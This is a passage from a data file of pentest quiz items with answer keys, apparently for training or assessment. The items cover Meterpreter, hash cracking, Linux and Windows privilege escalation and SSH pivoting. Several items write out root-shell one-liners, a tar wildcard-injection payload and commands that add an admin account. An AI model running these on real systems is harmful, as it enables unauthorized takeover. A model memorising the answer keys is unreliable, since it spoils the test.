add_mcq("kb-pentest-076", "M07", "pentest-r1-m07-metasploit-framework-fundamentals-01", "P46", "pentest_metasploit_framework", 2,
    "What design feature of the Meterpreter payload provides heightened evasion against disk-based antivirus detection?",
    ["It executes entirely in volatile system memory via reflective DLL injection without writing executable files to the host disk", "It disables the Windows firewall kernel driver immediately upon connection", "It reboots the target machine into single-user safe mode", "It formats the primary hard drive to destroy event logs"],
    0, ["Meterpreter injects itself directly into the address space of a running process using Reflective DLL Injection, leaving no artifacts on disk.", "Meterpreter does not unhook or disable firewall drivers by default.", "Rebooting the victim machine would terminate the active in-memory session.", "Meterpreter does not format hard drives; destructive actions are strictly avoided."],
    "Meterpreter operates entirely in memory using Reflective DLL Injection, communicating over encrypted TLS channels and avoiding touching the target filesystem, which evades standard disk-based endpoint protection.")

add_log("kb-pentest-077", "M07", "pentest-r1-m07-metasploit-framework-fundamentals-01", "P110", "pentest_metasploit_framework", 2,
    "msf6 exploit(multi/handler) > sessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                   Connection\n  --  ----  ----                     -----------                   ----------\n  1         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ DC01    192.0.2.10:4444 -> 192.0.2.50:49158 (192.0.2.50)\n  2         shell x86/linux          uid=33(www-data) @ webserver  192.0.2.10:4445 -> 192.0.2.60:51224 (192.0.2.60)",
    "Analyzing the Metasploit sessions listing above, which session provides immediate SYSTEM-level administrative control on a Windows host?",
    ["Session 1 on host 192.0.2.50 (DC01) executing as NT AUTHORITY\\SYSTEM", "Session 2 on host 192.0.2.60 executing as www-data", "Session 4444 running on the local attacker workstation", "Session 49158 running on the network firewall"],
    0, ["Session 1 is an active Meterpreter x64 session running under the highest Windows local privilege 'NT AUTHORITY\\SYSTEM'.", "Session 2 is an unprivileged Linux shell running under 'www-data'.", "4444 is the local listening port on the attacker machine, not a session ID.", "49158 is the client ephemeral source port, not a session identifier."],
    "Session 1 has Id 1, running a 64-bit Meterpreter session on host DC01 under 'NT AUTHORITY\\SYSTEM', representing full administrative control.")

add_short("kb-pentest-078", "M07", "pentest-r1-m07-payload-generation-msfvenom-01", "P76", "pentest_payload_msfvenom", 1,
    "Which command-line option in msfvenom specifies the output file format (e.g. elf, exe, or raw)?",
    ["-f", "--format"],
    "The '-f' or '--format' option in msfvenom designates the output binary format, such as '-f elf' for Linux binaries or '-f exe' for Windows executables.")

add_multi("kb-pentest-079", "M07", "pentest-r1-m07-shell-stabilization-tty-01", "P78", "pentest_shell_stabilization", 3,
    "Which of the following commands are required to upgrade a raw netcat reverse shell into a fully interactive pseudo-terminal (PTY) with job control and tab completion? (Select all that apply)",
    ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "stty raw -echo; fg", "export TERM=xterm-256color", "format c: /fs:ntfs"],
    [0, 1, 2], ["Spawning a pseudo-terminal with Python allocates a PTY device file.", "Setting the local terminal line discipline to raw with echo disabled and bringing the process to foreground passes raw keypresses (like Ctrl+C and Tab) cleanly.", "Exporting TERM enables proper color rendering, cursor positioning, and clear screen functionality.", "Formatting a disk is a destructive Windows filesystem operation completely unrelated to Linux TTY stabilization."],
    "Full PTY stabilization requires: 1. Spawning a pty with Python ('pty.spawn'), 2. Backgrounding with Ctrl+Z, 3. Setting 'stty raw -echo' on the host and running 'fg', and 4. Setting terminal environment variables ('export TERM=xterm').")

# --- M08: Password Attacks (11 items) ---
add_mcq("kb-pentest-080", "M08", "pentest-r1-m08-hash-identification-offline-cracking-01", "P47", "pentest_hash_cracking", 1,
    "What inherent cryptographic vulnerability makes legacy Windows NTLM password hashes susceptible to rapid offline cracking and Pass-the-Hash attacks?",
    ["NTLM hashes are unsalted MD4 digests, meaning identical passwords always produce identical hashes and allow precomputed dictionary attacks", "NTLM hashes use symmetric DES encryption with a hardcoded static key", "NTLM hashes are automatically decrypted by the web browser during HTTP requests", "NTLM hashes expire every 15 minutes, requiring automated renewal"],
    0, ["NTLM hashes do not incorporate a cryptographic salt; identical passwords result in identical 32-character hex hashes, enabling precomputed rainbow tables.", "NTLM is a one-way hashing function based on MD4, not a DES symmetric cipher.", "Browsers do not decrypt one-way password hashes.", "NTLM hashes stored in SAM or NTDS.dit are static until the user changes their password."],
    "NTLM hashes are calculated as MD4(UTF-16LE(password)) with zero cryptographic salt, making them vulnerable to precomputed lookup tables, rainbow tables, and pass-the-hash attacks.")

add_mcq("kb-pentest-081", "M08", "pentest-r1-m08-hash-identification-offline-cracking-01", "P48", "pentest_hash_cracking", 2,
    "Which command-line argument specifies the target hash algorithm format in John the Ripper (e.g. for NTLM)?",
    ["--format=NT", "--hash=NTLM", "--algo=windows", "--type=md4"],
    0, ["John uses '--format=NT' to designate Windows NTLM hashes.", "'--hash=' is not a valid John the Ripper option.", "'--algo=' is not John syntax.", "'--type=' is not John syntax."],
    "John the Ripper uses the '--format=' flag to specify the hash parsing format, where '--format=NT' corresponds to Windows NTLM hashes.")

add_mcq("kb-pentest-082", "M08", "pentest-r1-m08-hash-identification-offline-cracking-01", "P49", "pentest_hash_cracking", 2,
    "When using Hashcat to crack extracted Windows NTLM password hashes, which hash type identifier (-m) must be configured?",
    ["-m 1000", "-m 0", "-m 1800", "-m 3200"],
    0, ["Hashcat mode 1000 corresponds to NTLM.", "Mode 0 corresponds to MD5.", "Mode 1800 corresponds to SHA-512 ($6$) Linux crypt hashes.", "Mode 3200 corresponds to bcrypt hashes."],
    "In Hashcat, '-m 1000' specifies the NTLM hash algorithm, enabling GPU acceleration to test billions of candidates per second.")

add_log("kb-pentest-083", "M08", "pentest-r1-m08-hash-identification-offline-cracking-01", "P49", "pentest_hash_cracking", 2,
    "$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt\n...\nb4b9b02e6f09a9bd760f388b67351e2b:Password123!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 1000 (NTLM)",
    "Review the Hashcat cracking session output above. What plaintext credential was successfully cracked for hash 'b4b9b02e6f09a9bd760f388b67351e2b'?",
    ["Password123!", "rockyou.txt", "NTLM", "Cracked"],
    0, ["Hashcat outputs '<hash>:<plaintext>', confirming 'Password123!' as the plaintext password.", "rockyou.txt is the input dictionary file path.", "NTLM is the cryptographic hash algorithm name.", "Cracked is the execution status string."],
    "Hashcat outputs the cracked hash followed by a colon and the discovered plaintext password: 'Password123!'." )

add_mcq("kb-pentest-084", "M08", "pentest-r1-m08-online-brute-force-hydra-01", "P50", "pentest_online_brute_force", 2,
    "When performing online network authentication testing with Hydra, why are the '-t' (tasks) and '-W' (wait) flags critical for operational safety?",
    ["They throttle connection concurrency and inter-request timing to prevent causing Denial of Service (DoS) and triggering account lockouts", "They enable GPU hardware acceleration inside Hydra", "They force the target service to disable password expiration policies", "They encrypt the outgoing brute-force traffic with quantum cryptography"],
    0, ["Limiting threads (-t) and adding wait intervals (-W) prevents crashing network daemons and exceeding lock-out thresholds.", "Hydra is a network authentication brute-forcer and does not perform GPU offline cracking.", "Client tools cannot unilaterally modify target Active Directory password policies.", "Traffic is sent over standard application protocols, not quantum encryption."],
    "Aggressive multi-threaded network brute-forcing can easily overwhelm network daemons or trigger enterprise account lockout policies; tuning '-t' and '-W' ensures safe, controlled testing.")

add_short("kb-pentest-085", "M08", "pentest-r1-m08-online-brute-force-hydra-01", "P115", "pentest_online_brute_force", 1,
    "Which Hydra command-line flag directs the tool to exit immediately upon finding the first valid username and password pair?",
    ["-f"],
    "The '-f' flag instructs Hydra to terminate immediately after discovering the first valid set of credentials on a target service.")

add_mcq("kb-pentest-086", "M08", "pentest-r1-m08-password-mutations-rules-01", "P79", "pentest_password_mutations_rules", 2,
    "In Hashcat mask attack syntax, which character placeholder represents the decimal digit set [0-9]?",
    ["?d", "?u", "?l", "?s"],
    0, ["?d matches decimal digits 0 through 9.", "?u matches uppercase letters A through Z.", "?l matches lowercase letters a through z.", "?s matches special characters (!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~)."],
    "Hashcat mask charset placeholders: ?l = [a-z], ?u = [A-Z], ?d = [0-9], ?h = [0-9a-f], ?H = [0-9A-F], ?s = special characters, ?a = all characters.")

add_mcq("kb-pentest-087", "M08", "pentest-r1-m08-password-mutations-rules-01", "P80", "pentest_password_mutations_rules", 2,
    "How do rule-based password attacks (e.g. John the Ripper `--rules` or Hashcat `-r`) maximize the efficiency of wordlist cracking?",
    ["They apply deterministic programmatic mutations such as capitalizing characters, appending years, and leetspeak substitutions to root words", "They send phishing emails to users requesting their new passwords", "They rewrite the Linux kernel scheduler to assign 100% of memory to John", "They generate completely random 64-character strings without using wordlists"],
    0, ["Rule sets take common dictionary words (e.g. 'company') and systematically transform them into likely passwords ('Company2024!', 'c0mp4ny!').", "Rule-based cracking is an offline computational technique and does not send emails.", "Password cracking tools run in user space and do not rewrite operating system kernel schedulers.", "Generating purely random strings is a pure brute-force attack, not a rule-based dictionary mutation."],
    "Rule-based attacks simulate human password creation patterns by applying mutations (capitalization, leetspeak, appending digits and special symbols) to baseline wordlist candidates.")

add_log("kb-pentest-088", "M08", "pentest-r1-m08-unshadow-sam-dumping-01", "P81", "pentest_hash_extraction_pth", 2,
    "root:$6$8fZ7x1Q9$Yc7p4K...:19120:0:99999:7:::\noperator:$1$a9B2c3D4$eF5g6H...:19120:0:99999:7:::",
    "Review the Linux /etc/shadow extract above. What hashing algorithms are utilized for the 'root' and 'operator' accounts respectively?",
    ["root uses SHA-512 crypt ($6$), while operator uses MD5 crypt ($1$)", "root uses NTLM, while operator uses bcrypt", "root uses plain text, while operator uses AES-256", "root uses DES crypt, while operator uses SHA-256 crypt"],
    0, ["Linux crypt format prefixes: $1$ indicates MD5 crypt, $5$ indicates SHA-256 crypt, and $6$ indicates SHA-512 crypt.", "NTLM and bcrypt do not use the standard $6$ or $1$ Unix crypt magic identifiers.", "Neither account is stored in plaintext; both use one-way crypt hashing.", "DES crypt has no leading dollar sign identifier (13-character salt+hash), and $1$ is MD5."],
    "Standard Unix shadow files designate algorithms via numeric prefixes: '$1$' for MD5 crypt, '$5$' for SHA-256 crypt, and '$6$' for SHA-512 crypt.")

add_short("kb-pentest-089", "M08", "pentest-r1-m08-unshadow-sam-dumping-01", "P82", "pentest_hash_extraction_pth", 1,
    "What standard command-line utility bundled with John the Ripper combines /etc/passwd and /etc/shadow into a single file for cracking?",
    ["unshadow"],
    "The 'unshadow' utility reads '/etc/passwd' and '/etc/shadow' and outputs a merged file containing usernames and password hashes in John's native cracking format.")

add_multi("kb-pentest-090", "M08", "pentest-r1-m08-unshadow-sam-dumping-01", "P84", "pentest_hash_extraction_pth", 3,
    "Which of the following statements regarding Pass-the-Hash (PtH) attacks are accurate? (Select all that apply)",
    ["An attacker can authenticate to remote Windows services (e.g. SMB, WinRM) using an NTLM hash directly without cracking the plaintext password", "Pass-the-Hash attacks can authenticate to Kerberos services without converting the hash to a Kerberos ticket", "Pass-the-Hash works because the NTLM authentication protocol uses the password hash itself as the secret key in challenge-response handshakes", "Pass-the-Hash is completely prevented by changing the desktop wallpaper on target machines"],
    [0, 2], ["In NTLM authentication, the client proves knowledge of the secret key by encrypting a server challenge with the NTLM hash itself.", "Authenticating to Kerberos requires requesting a Ticket Granting Ticket (Overpass-the-Hash / Pass-the-Key), not raw NTLM PtH.", "The NTLM protocol never transmits or requires the plaintext password during authentication; the hash itself is the shared secret.", "Desktop wallpapers have no security relationship to NTLM authentication protocols."],
    "Pass-the-Hash allows an attacker to authenticate over NTLM-supported protocols (SMB, RPC, WMI) using the captured NTLM hash directly because the NTLM challenge-response protocol uses the hash itself as the cryptographic key.")

# --- M09: Privilege Escalation (12 items) ---
add_mcq("kb-pentest-091", "M09", "pentest-r1-m09-linux-privesc-suid-sudo-01", "P51", "pentest_linux_privesc", 1,
    "In Linux filesystem permissions, what operational behavior is granted when the SUID (Set Owner User ID) bit (octal 4000) is set on an executable file owned by root?",
    ["The binary executes with the effective permissions of the file owner (root) rather than the executing user", "The binary is automatically encrypted using AES-256", "The binary can only be executed by users logged in via physical console", "The binary automatically deletes itself after running once"],
    0, ["SUID causes the operating system kernel to set the process effective user ID (EUID) to that of the file owner (e.g. root) during execution.", "File permissions do not provide data encryption.", "SUID binaries execute across remote SSH, local shells, and cron equally.", "SUID files remain persistent on the filesystem."],
    "When an executable has the SUID bit set (chmod u+s or octal 4000), it runs with the privileges of the file owner (typically root), allowing unprivileged users to perform specific administrative tasks.")

add_log("kb-pentest-092", "M09", "pentest-r1-m09-linux-privesc-suid-sudo-01", "P52", "pentest_linux_privesc", 2,
    "$ sudo -l\nMatching Defaults entries for webadmin on target:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser webadmin may run the following commands on target:\n    (root) NOPASSWD: /usr/bin/find",
    "Review the 'sudo -l' output above. How can the unprivileged user 'webadmin' immediately elevate privileges to a root shell?",
    ["By executing 'sudo /usr/bin/find . -exec /bin/bash \\; -quit'", "By editing the /etc/passwd file using nano as webadmin", "By rebooting the server into rescue mode", "By running 'whoami /all' in the terminal"],
    0, ["The GTFOBins technique for 'find' allows executing arbitrary shell commands via the '-exec' parameter with root privileges without prompting for a password.", "The user 'webadmin' does not have write permissions to /etc/passwd directly.", "Rebooting the server terminates active sessions and does not grant root privileges.", "'whoami /all' is a Windows command, not a Linux privilege escalation payload."],
    "GTFOBins documents that 'find' can execute arbitrary system commands via '-exec'. Running 'sudo find . -exec /bin/bash \\; -quit' invokes bash with root permissions.")

add_mcq("kb-pentest-093", "M09", "pentest-r1-m09-linux-post-exploitation-privesc-01", "P53", "pentest_linux_post_exploitation", 2,
    "How can an attacker exploit a scheduled system cron job that executes a shell script as root every 5 minutes if the script file has permissions `-rwxrwxrwx` (777)?",
    ["By appending a reverse shell command or privileged user creation payload to the script and waiting for cron to execute it as root", "By sending an ICMP ping packet to the crond daemon process", "By deleting the /etc/crontab file from an unprivileged account", "By altering the hardware clock in the BIOS"],
    0, ["Since the script is world-writable, any unprivileged user can modify its contents to execute arbitrary commands under root when the scheduled task fires.", "ICMP pings are layer-3 network probes and cannot interact with local daemon cron jobs.", "Unprivileged users do not have permissions to delete /etc/crontab.", "BIOS hardware clocks cannot be altered from an unprivileged shell."],
    "World-writable scripts executed by root-owned cron jobs allow immediate privilege escalation: an attacker simply appends a command (e.g. adding an SUID bash binary or reverse shell) which executes as root on the next cron cycle.")

add_mcq("kb-pentest-094", "M09", "pentest-r1-m09-windows-privesc-service-perms-01", "P54", "pentest_windows_privesc", 2,
    "In Windows privilege escalation, why does an unquoted service path with spaces (e.g. `C:\\Program Files\\Custom App\\service.exe`) create an exploitable vulnerability?",
    ["The Windows Service Control Manager attempts to interpret space-separated segments as executables in order of appearance (e.g. C:\\Program.exe, then C:\\Program Files\\Custom.exe) before finding the full path", "The service process crashes and exposes the kernel memory", "Windows automatically deletes the executable binary", "The service path is converted into a base64 string that executes in PowerShell"],
    0, ["Without surrounding quotation marks, Windows ambiguity rules cause the Service Control Manager to probe each space delimiter sequentially as an executable path.", "The vulnerability is a path resolution logic flaw, not a kernel memory crash.", "Windows does not delete files during service startup.", "Path resolution does not execute PowerShell or base64 decoding."],
    "When a service binary path containing spaces lacks quotes, Windows checks each path segment sequentially (e.g., 'C:\\Program.exe', 'C:\\Program Files\\Custom.exe'); if an attacker has write permissions in one of those parent folders, placing an executable there achieves privilege escalation upon service launch.")

add_log("kb-pentest-095", "M09", "pentest-r1-m09-windows-privesc-service-perms-01", "P55", "pentest_windows_privesc", 2,
    "C:\\> icacls \"C:\\Program Files\\VulnerableApp\\app.exe\"\nC:\\Program Files\\VulnerableApp\\app.exe BUILTIN\\Users:(I)(F)\n                                      NT AUTHORITY\\SYSTEM:(I)(F)\n                                      BUILTIN\\Administrators:(I)(F)",
    "Analyzing the Windows icacls output above, what misconfiguration allows any standard user to achieve privilege escalation?",
    ["BUILTIN\\Users has Full control (F) permissions on the service executable, allowing standard users to overwrite the binary with a malicious payload", "NT AUTHORITY\\SYSTEM has read-only permissions on the file", "The executable file is encrypted with Windows EFS", "BUILTIN\\Administrators has been removed from the access control list"],
    0, ["'BUILTIN\\Users:(I)(F)' grants all standard local users Full control, allowing them to rename or replace the binary with a reverse shell and restart the service.", "SYSTEM has (F) Full access, not read-only.", "The output shows standard NTFS ACL entries, not EFS encryption.", "Administrators are explicitly listed with (F) Full control."],
    "Granting 'BUILTIN\\Users' Full access (F) or Modify (M) permissions on a binary that executes as SYSTEM allows any local user to replace the executable with a malicious binary to gain SYSTEM privileges.")

add_mcq("kb-pentest-096", "M09", "pentest-r1-m09-windows-privesc-service-perms-01", "P56", "pentest_windows_privesc", 2,
    "Which Windows Registry key is commonly abused to achieve persistence and privilege escalation when unprivileged users have write access to system autorun entries?",
    ["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU\\Control Panel\\Desktop", "HKLM\\HARDWARE\\DESCRIPTION\\System", "HKCR\\Directory\\Background"],
    0, ["The 'HKLM\\...\\CurrentVersion\\Run' registry key automatically executes configured program binaries whenever any user logs in, running in elevated contexts if configured under HKLM.", "Desktop control panel keys configure UI themes and wallpaper, not system startup executables.", "HARDWARE description keys store volatile hardware detection information.", "Directory background keys configure context menu items in Windows Explorer."],
    "The 'Run' and 'RunOnce' registry keys under HKLM (HKEY_LOCAL_MACHINE) configure programs to launch automatically upon user login, providing persistence and privilege escalation if writable.")

add_log("kb-pentest-097", "M09", "pentest-r1-m09-linux-post-exploitation-privesc-01", "P85", "pentest_linux_post_exploitation", 3,
    "$ getcap -r / 2>/dev/null\n/usr/bin/python3.8 = cap_setuid+ep\n/usr/bin/ping = cap_net_raw+ep",
    "Review the Linux file capabilities audit output above. How can an attacker leverage the capabilities assigned to python3.8 to achieve root access?",
    ["By executing python3.8 and calling 'os.setuid(0)' followed by spawning a root shell with 'os.system(\"/bin/bash\")'", "By connecting to port 38 in python", "By sending raw ICMP packets to the local loopback adapter", "By compiling a new Linux kernel module using python"],
    0, ["'cap_setuid+ep' permits the python binary to set its process UID to 0 (root); executing 'import os; os.setuid(0); os.system(\"/bin/bash\")' spawns a root shell.", "Port 38 is unrelated to POSIX capabilities.", "cap_net_raw is assigned to ping, which allows raw socket creation but not root user ID modification.", "Kernel modules require root module loading privileges (cap_sys_module), not setuid."],
    "The 'cap_setuid+ep' capability grants a binary the ability to arbitrarily change its UID. An unprivileged user running '/usr/bin/python3.8 -c \"import os; os.setuid(0); os.system('/bin/bash')\"' gains a root shell.")

add_mcq("kb-pentest-098", "M09", "pentest-r1-m09-linux-post-exploitation-privesc-01", "P86", "pentest_linux_post_exploitation", 3,
    "In Linux privilege escalation, how can a root cron job executing `cd /var/backups && tar -cf backup.tar *` be exploited via command-line parameter injection?",
    ["By creating files named '--checkpoint=1' and '--checkpoint-action=exec=sh payload.sh' in /var/backups to trick tar into executing arbitrary commands", "By sending a SIGKILL signal to the tar process", "By compressing the /etc/shadow file into a zip archive", "By creating a file named 'tar' in the /root directory"],
    0, ["The wildcard '*' expands all filenames as arguments to tar; filenames starting with '--checkpoint' are parsed as command-line options rather than target files.", "Unprivileged users cannot send signals to processes owned by root.", "Compressing files requires write access to the destination and does not inject shell parameters.", "Creating files in /root is blocked by filesystem permissions."],
    "GNU tar supports '--checkpoint' options. When wildcard expansion includes files named '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh', tar executes 'shell.sh' as root.")

add_log("kb-pentest-099", "M09", "pentest-r1-m09-windows-post-exploitation-privesc-01", "P87", "pentest_windows_post_exploitation", 2,
    "C:\\> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                               State\n============================= ========================================= ========\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects                     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled",
    "Review the 'whoami /priv' output above from an unprivileged service account shell. Which enabled privilege allows immediate elevation to NT AUTHORITY\\SYSTEM using token impersonation exploits?",
    ["SeImpersonatePrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeSecurityPrivilege"],
    0, ["SeImpersonatePrivilege permits a process to impersonate any client token it can coerce into authenticating locally, exploitable via Potato-family tools (e.g. PrintSpoofer/SweetPotato).", "SeChangeNotifyPrivilege simply allows bypassing directory traversal access checks and is enabled by default for all users.", "SeCreateGlobalPrivilege allows named object creation in global namespaces.", "SeSecurityPrivilege is not present in the output and governs auditing logs."],
    "SeImpersonatePrivilege allows an attacker to abuse named pipes or RPC coercion (via PrintSpoofer, JuicyPotato, etc.) to capture a SYSTEM token and spawn a shell as NT AUTHORITY\\SYSTEM.")

add_short("kb-pentest-100", "M09", "pentest-r1-m09-windows-privesc-service-perms-01", "P88", "pentest_windows_privesc", 2,
    "Which Windows Service Control command-line syntax queries the detailed configuration and binary path of a service named 'AuditSvc'?",
    ["sc qc AuditSvc", "sc.exe qc AuditSvc", "sc qc"],
    "The 'sc qc <servicename>' command (Query Config) displays service start type, binary path name (BINARY_PATH_NAME), and service account credentials.")

add_short("kb-pentest-101", "M09", "pentest-r1-m09-linux-privesc-suid-sudo-01", "P116", "pentest_linux_privesc", 2,
    "What GTFOBins command-line syntax allows an attacker to spawn a privileged root shell using an SUID-root `/usr/bin/find` binary?",
    ["find . -exec /bin/sh -p \\; -quit", "find -exec /bin/sh -p \\;", "find . -exec /bin/sh \\;"],
    "The command 'find . -exec /bin/sh -p \\; -quit' executes '/bin/sh' with the '-p' flag to retain the elevated effective SUID root privileges without dropping permissions.")

add_multi("kb-pentest-102", "M09", "pentest-r1-m09-windows-privesc-service-perms-01", "P118", "pentest_windows_privesc", 3,
    "Which of the following native Windows commands correctly create a new local user and add that user to the local Administrators group? (Select all that apply)",
    ["net user hacker Password123! /add", "net localgroup administrators hacker /add", "useradd -m hacker -s /bin/bash", "grant-admin hacker"],
    [0, 1], ["'net user <username> <password> /add' creates a new local user account on Windows.", "'net localgroup administrators <username> /add' adds the designated account to the local Administrators security group.", "useradd is a Linux command, not native Windows command syntax.", "'grant-admin' is a fictitious command not present in Windows."],
    "On Windows, 'net user <name> <pass> /add' creates a local user account, and 'net localgroup administrators <name> /add' promotes that user to administrative status.")

# --- M10: Pivoting & Port Forwarding (11 items) ---
add_mcq("kb-pentest-103", "M10", "pentest-r1-m10-ssh-port-forwarding-tunnels-01", "P57", "pentest_pivoting", 1,
    "In network penetration testing, what is the definition and strategic purpose of 'pivoting'?",
    ["Using a compromised host that has dual network interfaces to route traffic and attack tools into an otherwise unreachable internal network segment", "Switching from manual exploitation to automated vulnerability scanners", "Rotating password dictionaries during an offline brute-force attack", "Reinstalling the operating system on the tester's attack machine"],
    0, ["Pivoting leverages a compromised foothold host to route packets across network boundaries into isolated internal subnets.", "Tool switching is operational workflow, not network pivoting.", "Rotating wordlists is a password cracking tactic.", "Reinstalling OS is maintenance and unrelated to lateral movement."],
    "Pivoting is the post-exploitation technique of routing traffic through a compromised system (foothold) to access hosts on adjacent, isolated network segments not directly reachable from the attacker's machine.")

add_mcq("kb-pentest-104", "M10", "pentest-r1-m10-ssh-port-forwarding-tunnels-01", "P58", "pentest_ssh_tunneling", 2,
    "When establishing an SSH Local Port Forward (`ssh -L 8080:10.10.10.50:80 user@pivot`), how is network traffic routed?",
    ["Connections sent to local port 8080 on the tester machine are encrypted over SSH to the pivot host, which forwards them directly to 10.10.10.50 on port 80", "Connections sent to the pivot host on port 80 are routed back to the tester's port 8080", "All DNS queries on the target network are redirected to 10.10.10.50", "The remote host 10.10.10.50 is forced to download a reverse shell payload"],
    0, ["'ssh -L <local_port>:<target_ip>:<target_port>' listens locally on the client and forwards incoming connections through the SSH server to the destination.", "Routing remote traffic back to the local client describes remote port forwarding (-R), not local forwarding (-L).", "Port forwarding routes transport layer streams, not system-wide DNS.", "Port forwarding creates a communication tunnel; it does not execute payloads on the target."],
    "SSH local port forwarding (-L) opens a local listening port on the client machine; connecting to that local port tunnels traffic through the SSH connection to the remote destination.")

add_mcq("kb-pentest-105", "M10", "pentest-r1-m10-ssh-port-forwarding-tunnels-01", "P59", "pentest_ssh_tunneling", 2,
    "In which operational scenario is SSH Remote Port Forwarding (`ssh -R 4444:127.0.0.1:4444 user@attacker`) specifically required?",
    ["When a compromised host in an internal network needs to expose a port or route a reverse shell back to an attacker listener across NAT boundaries", "When the attacker wants to scan internal network ports using Nmap UDP probes", "When the target web server needs to format its hard drive", "When cracking passwords using John the Ripper"],
    0, ["Remote port forwarding (-R) opens a listening port on the remote machine that forwards incoming traffic back to the local client, ideal for catching reverse shells behind NAT.", "SSH port forwards operate over TCP and cannot forward UDP probes natively.", "Port forwarding does not format storage.", "Password cracking is an offline CPU/GPU task and does not use SSH tunneling."],
    "SSH remote port forwarding (-R) allows a compromised machine behind NAT to open a listening port on the attacker's server, tunneling connections back into the internal network.")

add_short("kb-pentest-106", "M10", "pentest-r1-m10-dynamic-socks-proxychains-01", "P60", "pentest_dynamic_pivoting", 1,
    "Which SSH command-line option creates a dynamic application-level SOCKS proxy tunnel (e.g. `ssh -D 1080 user@pivot`)?",
    ["-D", "ssh -D"],
    "The '-D' option instructs SSH to allocate a local socket that acts as a SOCKS4/SOCKS5 proxy server, dynamically routing arbitrary application connections through the SSH server.")

add_mcq("kb-pentest-107", "M10", "pentest-r1-m10-dynamic-socks-proxychains-01", "P61", "pentest_dynamic_pivoting", 2,
    "What is the primary function of `proxychains` during a network assessment engagement?",
    ["It intercepts standard dynamically linked networking syscalls (connect, gethostbyname) in command-line tools and redirects them through configured SOCKS/HTTP proxies", "It cracks WPA2 Wi-Fi encryption handshakes", "It generates self-signed SSL certificates for web servers", "It executes SQL injection exploits against MariaDB databases"],
    0, ["Proxychains hooks dynamically linked TCP socket calls via LD_PRELOAD, forcing tools like Nmap, curl, and smbclient through SOCKS proxies.", "Wi-Fi cracking is performed with tools like aircrack-ng, not proxychains.", "Certificate generation is performed with openssl, not proxychains.", "Proxychains is a transport-layer proxy wrapper, not an application exploit tool."],
    "Proxychains wraps standard dynamically linked programs, forcing their outbound TCP connections to tunnel through configured proxy chains (e.g. Tor, SOCKS5) defined in 'proxychains.conf'.")

add_log("kb-pentest-108", "M10", "pentest-r1-m10-internal-subnet-routing-01", "P69", "pentest_internal_routing", 2,
    "$ ip route\ndefault via 192.0.2.1 dev eth0 proto dhcp src 192.0.2.15 metric 100\n10.50.0.0/24 dev eth1 proto kernel scope link src 10.50.0.5\n192.0.2.0/24 dev eth0 proto kernel scope link src 192.0.2.15",
    "Analyzing the Linux routing table output above from a compromised web server, what previously unexposed internal subnet is accessible for lateral movement?",
    ["10.50.0.0/24 reachable via network interface eth1", "192.0.2.0/24 reachable via eth0", "127.0.0.0/8 loopback interface", "0.0.0.0/0 default gateway only"],
    0, ["Interface eth1 is configured with IP 10.50.0.5 on subnet 10.50.0.0/24, revealing a dual-homed pivot interface to internal systems.", "192.0.2.0/24 is the external DMZ subnet where the attacker originally established the foothold.", "Loopback is local to the machine and not a multi-host network subnet.", "0.0.0.0/0 is the default route, not an internal private corporate subnet."],
    "The routing table shows a secondary interface 'eth1' connected to '10.50.0.0/24', indicating a dual-homed machine that can be used as a pivot point into the internal network.")

add_mcq("kb-pentest-109", "M10", "pentest-r1-m10-ssh-port-forwarding-tunnels-01", "P70", "pentest_pivoting", 3,
    "From a Blue Team defensive perspective, what network telemetry anomaly is the strongest indicator of active lateral movement via an internal pivot?",
    ["Unexpected internal SSH, SMB, or RDP connections originating from a DMZ web server to high-value internal database or domain controller hosts", "A spike in outbound HTTPS traffic from developer workstations to GitHub", "Periodic DNS queries for public search engine domains", "A workstation downloading Windows operating system updates from Microsoft update servers"],
    0, ["DMZ web servers should rarely or never initiate administrative management connections (SSH/SMB/RDP) into internal subnets; such anomalous lateral traffic triggers high-severity SIEM alerts.", "GitHub traffic from developer workstations is expected engineering activity.", "Public search engine DNS queries are normal user browsing behavior.", "Windows update traffic from official Microsoft update domains is expected operating system behavior."],
    "DMZ servers generally only receive inbound traffic from clients and send specific backend database queries. Originating lateral management protocols (SSH, SMB, RDP) from a DMZ host to internal subnets is a primary indicator of compromise (IoC).")

add_mcq("kb-pentest-110", "M10", "pentest-r1-m10-chisel-tunneling-firewalls-01", "P90", "pentest_chisel_tunneling", 2,
    "Why is Chisel particularly effective for pivoting through restrictive egress firewalls during penetration tests?",
    ["It encapsulates TCP tunnels and reverse SOCKS proxies inside standard HTTP/1.1 and WebSocket transport over permitted egress ports (e.g. 80 and 443)", "It disables deep packet inspection on perimeter firewall appliances", "It cracks network switch admin passwords using rainbow tables", "It replaces the physical Ethernet cables with fiber optics"],
    0, ["Chisel wraps all tunnel communication within standard HTTP/WebSocket traffic, allowing it to traverse enterprise proxies and firewalls that permit web traffic.", "Chisel tunnels traffic through existing rules; it does not alter or disable remote firewall firmware.", "Chisel is a tunneling proxy, not a switch password brute-forcer.", "Chisel is software and does not modify physical cabling."],
    "Chisel creates encrypted TCP tunnels encapsulated within standard HTTP/WebSocket connections, enabling penetration testers to establish reverse SOCKS proxies through restrictive firewalls that only permit outbound web traffic.")

add_mcq("kb-pentest-111", "M10", "pentest-r1-m10-dynamic-socks-proxychains-01", "P91", "pentest_dynamic_pivoting", 2,
    "In `/etc/proxychains.conf`, why is enabling the `proxy_dns` directive critical during an engagement?",
    ["It routes DNS resolution queries through the SOCKS proxy to prevent local DNS leakages that disclose target hostnames to external or perimeter networks", "It speeds up port scanning by a factor of 100", "It disables all DNS logging on target Active Directory domain controllers", "It converts all IPv4 target addresses into IPv6 addresses"],
